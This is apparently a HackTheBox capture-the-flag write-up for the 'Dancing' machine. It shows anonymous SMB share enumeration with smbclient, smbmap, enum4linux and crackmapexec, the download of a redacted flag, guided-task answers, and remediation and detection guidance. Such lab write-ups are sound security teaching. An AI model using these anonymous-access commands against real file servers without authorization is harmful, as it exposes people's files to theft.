# Dancing - HackTheBox Writeup

![Dancing Banner](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen) ![OS](https://img.shields.io/badge/OS-Windows-blue) ![Status](https://img.shields.io/badge/Status-Pwned-success)

## Machine Information

| Attribute | Value |
|-----------|-------|
| **Machine Name** | Dancing |
| **Difficulty** | Very Easy |
| **Operating System** | Windows |
| **IP Address** | 10.129.x.x |
| **Points** | 0 |
| **Release Date** | 30 September 2021 |
| **Pwned Date** | 04 January 2026 |
| **Player Rank** | #376247 |

---

## Table of Contents

1. [Overview](#overview)
2. [Guided Tasks](#guided-tasks)
3. [Reconnaissance](#reconnaissance)
4. [Enumeration](#enumeration)
5. [Exploitation](#exploitation)
6. [Flag Retrieval](#flag-retrieval)
7. [Alternative Methods](#alternative-methods)
8. [Security Analysis](#security-analysis)
9. [Remediation](#remediation)
10. [Key Takeaways](#key-takeaways)
11. [References](#references)

---

## Overview

**Dancing** is the third machine in HackTheBox's Starting Point Tier 0 series, focusing on **SMB (Server Message Block)** protocol exploitation. This Windows-based machine teaches fundamental concepts about network file sharing, share enumeration, and the dangers of misconfigured permissions.

### Learning Objectives

- Understanding SMB/CIFS protocol fundamentals
- Enumerating network shares using `smbclient`
- Identifying misconfigured share permissions
- Navigating Windows file shares remotely
- File transfer operations via SMB
- Security implications of anonymous share access

---

## Guided Tasks

Dancing includes 7 guided tasks to help beginners understand SMB enumeration:

### Task 1: What does the 3-letter acronym SMB stand for?

**Answer:** `Server Message Block`

**Explanation:**
SMB is a network protocol developed by Microsoft for sharing files, printers, and other resources across a network. It operates on port 445 (modern systems) and legacy port 139 (NetBIOS over TCP/IP).

---

### Task 2: What port does SMB use to operate at?

**Answer:** `445`

**Explanation:**
- **Port 445**: SMB over TCP (modern, direct hosting)
- **Port 139**: SMB over NetBIOS (legacy systems)

Most modern Windows systems use port 445 exclusively.

---

### Task 3: What is the service name for port 445 that came up in our Nmap scan?

**Answer:** `microsoft-ds`

**Explanation:**
The service name `microsoft-ds` stands for "Microsoft Directory Services" and is the standard designation for SMB/CIFS services running on port 445.

---

### Task 4: What is the 'flag' or 'switch' we can use with the smbclient utility to 'list' the available shares on Dancing?

**Answer:** `-L`

**Explanation:**
The `-L` flag in smbclient lists all available shares on a target host:
```bash
smbclient -L //<target_ip>
```

---

### Task 5: How many shares are there on Dancing?

**Answer:** `4`

**Explanation:**
When enumerating the target, you'll discover 4 SMB shares (typically: ADMIN$, C$, IPC$, and WorkShares).

---

### Task 6: What is the name of the share we are able to access in the end with a blank password?

**Answer:** `WorkShares`

**Explanation:**
The WorkShares share is misconfigured to allow anonymous access without authentication, making it the target for exploitation.

---

### Task 7: What is the command we can use within the SMB shell to download the files we find?

**Answer:** `get`

**Explanation:**
The `get` command in smbclient downloads files from the remote share to your local system:
```bash
smb: \> get flag.txt
```

---

## Reconnaissance

### Phase 1: Network Discovery

First, verify connectivity to the target machine:

```bash
# Test ICMP connectivity
ping -c 4 <target_ip>
```

**Expected Output:**
```
PING 10.129.x.x (10.129.x.x) 56(84) bytes of data.
64 bytes from 10.129.x.x: icmp_seq=1 ttl=127 time=45.2 ms
64 bytes from 10.129.x.x: icmp_seq=2 ttl=127 time=44.8 ms
```

**Key Observation:** TTL of 127 indicates a Windows system (default Windows TTL is 128, decremented by 1 hop).

---

### Phase 2: Port Scanning

Perform comprehensive port scanning to identify open services:

```bash
# Quick scan of all ports
nmap -p- --min-rate=1000 <target_ip>

# Detailed scan of discovered ports
nmap -sC -sV -p 135,139,445 <target_ip>
```

**Expected Output:**
```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.x.x
Host is up (0.045s latency).

PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?

Host script results:
| smb2-time: 
|   date: 2026-01-04T22:00:00
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

**Key Findings:**
- Port 445 (SMB) is open
- SMB signing is not required (potential security weakness)
- No authentication required for enumeration

---

## Enumeration

### Phase 1: SMB Share Discovery

Use `smbclient` to enumerate available shares:

```bash
# List shares without authentication (-N = no password)
smbclient -L //<target_ip> -N
```

**Expected Output:**
```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      

Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to <target_ip> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

**Analysis of Discovered Shares:**

| Share Name | Type | Purpose | Access |
|------------|------|---------|--------|
| **ADMIN$** | Disk | Administrative share for remote administration | ❌ Requires admin credentials |
| **C$** | Disk | Default root drive share | ❌ Requires admin credentials |
| **IPC$** | IPC | Inter-Process Communication | ⚠️ Null session allowed |
| **WorkShares** | Disk | Custom share (likely misconfigured) | ✅ **Anonymous access** |

---

### Phase 2: Share Access Testing

Test access to each share:

```bash
# Attempt to connect to WorkShares anonymously
smbclient //<target_ip>/WorkShares -N

# If successful, you'll see:
smb: \>
```

**Alternative syntax:**
```bash
# Using blank username and password explicitly
smbclient //<target_ip>/WorkShares -U "" --password=""
```

---

## Exploitation

### Step 1: Connect to Vulnerable Share

Once connected to the WorkShares share, navigate the directory structure:

```bash
# List contents of current directory
smb: \> ls
```

**Expected Output:**
```
  .                                   D        0  Mon Mar 29 09:22:01 2021
  ..                                  D        0  Mon Mar 29 09:22:01 2021
  Amy.J                               D        0  Mon Mar 29 10:08:24 2021
  James.P                             D        0  Thu Jun  3 09:38:03 2021

                5114111 blocks of size 4096. 1732597 blocks available
```

**Analysis:**
- Two user directories exist: `Amy.J` and `James.P`
- Need to explore both to locate the flag

---

### Step 2: Directory Navigation

Navigate through each directory:

```bash
# Check Amy.J directory
smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 10:08:24 2021
  ..                                  D        0  Mon Mar 29 10:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 11:00:37 2021

# Check James.P directory
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 09:38:03 2021
  ..                                  D        0  Thu Jun  3 09:38:03 2021
  flag.txt                            A       32  Mon Mar 29 10:26:57 2021
```

**Key Finding:** `flag.txt` is located in the `James.P` directory!

---

### Step 3: File Download

Download the flag file to your local system:

```bash
# Ensure you're in the correct directory
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)

# Exit smbclient
smb: \James.P\> exit
```

---

## Flag Retrieval

After downloading the flag, read its contents:

```bash
# Display flag contents
cat flag.txt
```

**Output:**
```
[FLAG REDACTED - Complete the challenge to discover it!]
```

**🎉 Congratulations! You've successfully pwned Dancing!**

---

## Alternative Methods

### Method 1: One-Liner SMB Access

Execute commands in a single line:

```bash
# Navigate to directory and download file
smbclient //<target_ip>/WorkShares -N -c "cd James.P; get flag.txt"
```

---

### Method 2: Using enum4linux

Comprehensive SMB enumeration tool:

```bash
# Full enumeration (verbose)
enum4linux -a <target_ip>

# Share enumeration only
enum4linux -S <target_ip>
```

**Output includes:**
- Available shares
- User accounts
- Password policy
- OS information
- Domain/Workgroup details

---

### Method 3: Using smbmap

Modern SMB enumeration and exploitation tool:

```bash
# List shares with permissions
smbmap -H <target_ip>

# Download file directly
smbmap -H <target_ip> -R WorkShares --download 'James.P\flag.txt'
```

**Example Output:**
```
[+] IP: 10.129.x.x:445  Name: dancing.htb
        Disk                Permissions     Comment
        ----                -----------     -------
        ADMIN$              NO ACCESS       Remote Admin
        C$                  NO ACCESS       Default share
        IPC$                NO ACCESS       Remote IPC
        WorkShares          READ ONLY
```

---

### Method 4: Using CrackMapExec

Enterprise-focused SMB assessment tool:

```bash
# Enumerate shares
crackmapexec smb <target_ip> --shares -u '' -p ''

# Spider shares for files
crackmapexec smb <target_ip> -u '' -p '' --spider WorkShares
```

---

## Security Analysis

### Vulnerability: Anonymous SMB Access

**CVE:** N/A (Configuration Issue)
**Severity:** Medium
**CVSS Score:** 5.3 (Base)

**Description:**
The WorkShares SMB share allows anonymous access without authentication, exposing sensitive files to unauthorized users.

---

### Attack Surface Analysis

1. **Unauthenticated Access**
   - No credentials required
   - Any network user can access WorkShares
   - Information disclosure vulnerability

2. **Directory Traversal**
   - Full read access to all subdirectories
   - User personal folders exposed (Amy.J, James.P)
   - Potential for data exfiltration

3. **File Enumeration**
   - Complete file listing available
   - File metadata exposed (timestamps, sizes)
   - Sensitive filenames revealed

---

### Impact Assessment

**Confidentiality:** HIGH
- Sensitive files exposed (flag.txt, worknotes.txt)
- User directory structure revealed
- Potential intellectual property leakage

**Integrity:** LOW
- Read-only access limits damage
- No file modification/deletion possible

**Availability:** LOW
- No denial-of-service risk
- Service remains operational

---

## Remediation

### Short-Term Fixes

1. **Disable Anonymous Access**

```powershell
# Disable null session shares
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RestrictNullSessAccess" -Value 1

# Remove anonymous access to specific share
Remove-SmbShare -Name "WorkShares" -Force
New-SmbShare -Name "WorkShares" -Path "C:\WorkShares" -FullAccess "DOMAIN\Authorized_Users"
```

2. **Implement Access Controls**

```powershell
# Configure NTFS permissions
icacls "C:\WorkShares" /grant "DOMAIN\Authorized_Users:(OI)(CI)F" /inheritance:r
icacls "C:\WorkShares" /remove "Everyone"
```

3. **Enable SMB Signing**

```powershell
# Require SMB signing (prevents relay attacks)
Set-SmbServerConfiguration -RequireSecuritySignature $True -Force
```

---

### Long-Term Recommendations

1. **Network Segmentation**
   - Isolate file servers in secure VLAN
   - Implement firewall rules to restrict SMB access
   - Allow SMB only from trusted networks

2. **Principle of Least Privilege**
   - Grant minimum necessary permissions
   - Use group-based access control
   - Regularly audit share permissions

3. **Monitoring and Auditing**

```powershell
# Enable SMB logging
Set-SmbServerConfiguration -AuditSmb1Access $True

# Monitor share access
Get-SmbSession | Select-Object -Property ClientComputerName, ClientUserName, NumOpens
```

4. **Modern SMB Configuration**

```powershell
# Disable SMBv1 (deprecated, vulnerable)
Set-SmbServerConfiguration -EnableSMB1Protocol $False

# Enable SMBv3 encryption
Set-SmbServerConfiguration -EncryptData $True
```

---

## Key Takeaways

### Technical Lessons

1. **SMB Protocol Understanding**
   - Port 445 is standard for modern SMB
   - `microsoft-ds` service indicates SMB/CIFS
   - Anonymous access should never be permitted

2. **Enumeration Techniques**
   - `smbclient -L` lists available shares
   - `-N` flag attempts null session
   - Multiple tools available (smbmap, enum4linux, crackmapexec)

3. **File Transfer Operations**
   - `get` downloads files from SMB share
   - `put` uploads files (if write permissions exist)
   - `mget` downloads multiple files with wildcards

### Security Principles

1. **Default Deny Approach**
   - Start with no access
   - Explicitly grant permissions as needed
   - Regularly review and revoke unnecessary access

2. **Defense in Depth**
   - Multiple layers of security
   - Network segmentation
   - Authentication + authorization + auditing

3. **Assume Breach Mentality**
   - Monitor all access attempts
   - Log successful and failed authentications
   - Implement intrusion detection

---

## SMB Command Reference

### smbclient Commands

| Command | Description | Example |
|---------|-------------|---------|
| `ls` | List directory contents | `smb: \> ls` |
| `cd <dir>` | Change directory | `smb: \> cd James.P` |
| `pwd` | Print working directory | `smb: \> pwd` |
| `get <file>` | Download file | `smb: \> get flag.txt` |
| `mget <pattern>` | Download multiple files | `smb: \> mget *.txt` |
| `put <file>` | Upload file | `smb: \> put exploit.exe` |
| `rm <file>` | Delete file (if writable) | `smb: \> rm old.txt` |
| `mkdir <dir>` | Create directory (if writable) | `smb: \> mkdir backup` |
| `exit` | Exit smbclient | `smb: \> exit` |

---

## Environment Setup

### Required Tools

```bash
# Install smbclient (Debian/Ubuntu)
sudo apt update
sudo apt install smbclient

# Install enum4linux
sudo apt install enum4linux

# Install smbmap
sudo apt install smbmap

# Install CrackMapExec
sudo apt install crackmapexec
```

---

## Detection and Blue Team Perspective

### Indicators of Compromise (IOCs)

1. **Network Traffic Patterns**
   - Multiple SMB enumeration attempts
   - Connections to port 445 from unusual sources
   - High volume of SMB LIST requests

2. **Event Logs (Windows)**

```powershell
# Check SMB access logs
Get-WinEvent -LogName Microsoft-Windows-SmbServer/Security |
    Where-Object {$_.Id -eq 1009} | 
    Select-Object TimeCreated, Message

# Event ID 1009: Anonymous connection to share
```

3. **Anomalous Behavior**
   - Anonymous authentication success
   - Access to sensitive shares without credentials
   - File downloads from restricted directories

### SIEM Detection Rules

```yaml
# Example Splunk query
index=windows sourcetype=WinEventLog:Security EventCode=4624 
| where Logon_Type=3 AND Account_Name="ANONYMOUS LOGON"
| stats count by src_ip, dest_ip, Share_Name

# Example Elastic query
event.code: 5140 AND winlog.event_data.ShareName: "WorkShares" 
AND winlog.event_data.AccessMask: "*READ*"
```

---

## Additional Resources

### Official Documentation

- [Microsoft SMB Protocol Overview](https://docs.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview)
- [SMB Security Best Practices](https://docs.microsoft.com/en-us/windows-server/storage/file-server/smb-security)
- [smbclient Man Page](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)

### Tools and Frameworks

- [Samba Documentation](https://www.samba.org/samba/docs/)
- [Impacket Framework](https://github.com/SecureAuthCorp/impacket)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)

### Further Reading

- **SANS: SMB Relay Attacks**
- **MITRE ATT&CK: T1021.002 - SMB/Windows Admin Shares**
- **OWASP: Network Share Enumeration**

---

## Comparison with Previous Machines

| Aspect | Meow | Fawn | Dancing |
|--------|------|------|---------|
| **Protocol** | Telnet | FTP | SMB |
| **Port** | 23 | 21 | 445 |
| **OS** | Linux | Linux | Windows |
| **Vulnerability** | Weak Credentials | Anonymous Login | Misconfigured Share |
| **Complexity** | Very Easy | Very Easy | Very Easy |

---

## Next Steps

After completing Dancing, continue with:

1. **Redeemer** - Redis database exploitation
2. **Explosion** - RDP remote desktop protocol
3. **Preignition** - Web application enumeration

---

## Conclusion

Dancing provides essential hands-on experience with SMB protocol enumeration and exploitation. Understanding network file sharing vulnerabilities is crucial for both offensive and defensive cybersecurity roles. The concepts learned here apply to real-world penetration testing engagements where misconfigured SMB shares remain a common entry vector.

**Key Skill Acquired:** SMB/CIFS enumeration and exploitation

**Real-World Application:** Corporate network assessments, file server security audits

**Next Challenge:** Continue to Tier 0 machine #4: Redeemer

---

## Credits

- **Machine Creator:** HTB-Bot
- **Platform:** HackTheBox
- **Writeup Author:** Salim Hadda (@samli-neo)
- **Completion Date:** 04 January 2026
- **Player Rank:** #376247

---

<div align="center">

**🔒 Remember: Always obtain proper authorization before testing. Unauthorized access is illegal.**

[← Back to Starting Point](../../) | [View All Writeups](../../../)

</div>
